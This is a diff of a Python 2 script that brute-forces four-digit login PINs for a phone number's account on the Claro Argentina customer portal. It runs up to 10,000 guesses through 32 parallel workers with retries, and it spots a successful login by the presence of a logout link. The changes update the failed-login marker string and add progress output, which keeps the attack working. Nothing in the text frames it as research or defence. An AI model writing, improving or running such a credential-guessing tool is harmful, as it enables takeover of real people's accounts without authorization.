@@ -8,7 +8,7 @@ import sys
 import ClientForm
 from decoradores import Retry, Farm, Verbose
 
-VERBOSE = 2
+VERBOSE = 0
 LOGINURL = ("""http://individuos.claro.com.ar/web/guest/bienvenido"""
     """?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view"""
     """&p_p_col_id=column-1&p_p_col_count=1&saveLastPath=0"""
@@ -17,7 +17,7 @@ LOGINURL = ("""http://individuos.claro.com.ar/web/guest/bienvenido"""
 
 
 def print_dot(dot="·"):
-    sys.stderr.write(dot)
+    sys.stderr.write(str(dot))
     return sys.stderr.flush()
 
 
@@ -33,7 +33,7 @@ class Login:
     @Retry(15, pause=2)
     def get_forms(self, formurl=LOGINURL):
         if formurl not in self._forms:
-            warning("Consiguendo un formulario")
+            moreinfo("Consiguendo un formulario")
 
             try:
                 self._forms[formurl] = DEFAULTFORMS
@@ -52,7 +52,10 @@ class Login:
     @Retry(15, pause=2)
     def __call__(self, loginNumber, password):
         if not password % 100:
-            print_dot()
+            if not password % 500:
+                print_dot(str(password / 100) + "%")
+            else:
+                print_dot()
 
         form = self.get_forms(LOGINURL)[0]
         debug("Probando con %s" % password)
@@ -69,7 +72,7 @@ class Login:
             if '/c/portal/logout' in html:
                 debug("Encontrada: %s" % password)
                 return password
-            elif 'servlet/Controller?EVENT=GENERAR_PIN"' in html:
+            elif 'saveLastPath=0&_58_struts_action=%2Flogin%2Flogin' in html:
                 debug("No es %s" % password)
                 return False
             elif 'En este momento no podemos atender tu consulta.' in html:
@@ -83,15 +86,17 @@ class Login:
 def main(opts=None, args=None):
     sys.argv += [None, None]
     loginNumber = sys.argv.pop(1)
-    fromnumber = sys.argv.pop(1) or 0
-    tonumber = sys.argv.pop(1) or 10000
+    fromnumber = sys.argv.pop(1) or "0"
+    tonumber = sys.argv.pop(1) or "10000"
 
 #TODO: debe verificar el servicio antes de iniciar el proceso
 
     farm = Farm(Login, 32, True, True)
     debug("Farm created")
     
-    rango = xrange(int(fromnumber), int(tonumber))
+    rango = xrange(int(fromnumber.replace("%", "00")),
+        int(tonumber.replace("%", "00")))
+
     for number in rango:
         farm.enqueue((loginNumber, number))
     debug("Farm populated")
